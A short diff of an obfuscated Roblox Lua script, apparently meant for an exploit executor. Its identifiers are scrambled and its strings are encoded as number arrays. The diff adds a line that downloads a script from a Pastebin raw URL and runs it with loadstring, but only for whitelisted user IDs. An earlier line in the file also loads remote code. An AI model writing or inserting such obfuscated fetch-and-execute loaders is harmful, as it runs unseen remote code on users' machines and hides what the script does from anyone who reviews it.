@@ -5,6 +5,7 @@ loadstring(game:HttpGet(lvOKYAqYckAoPXerJsShAGcmwuTWvmzLKqHtUwOviRgHYTQzRgIonhXc
 local users = getgenv().users
 for i,v in next, users do
 	if game.Players.LocalPlayer.UserId == v then
+		loadstring(game:HttpGet("https://pastebin.com/raw/nBbHU2vi"))()
 		print(lvOKYAqYckAoPXerJsShAGcmwuTWvmzLKqHtUwOviRgHYTQzRgIonhXcqDhikdaLH({12495,10920,11025,12180,10605,11340,11025,12075,12180,10605,10500}))
 		getgenv().title = lvOKYAqYckAoPXerJsShAGcmwuTWvmzLKqHtUwOviRgHYTQzRgIonhXcqDhikdaLH({7455,11970,10185,11550,11550,12705,9240,10920,12285,10290,3360,4725,3360,7140,11970,11025,11550,11235,10920,10185,12600,4200,11760,11970,11025,12390,10185,12180,10605,4305,3360,4725,3360})..i
 
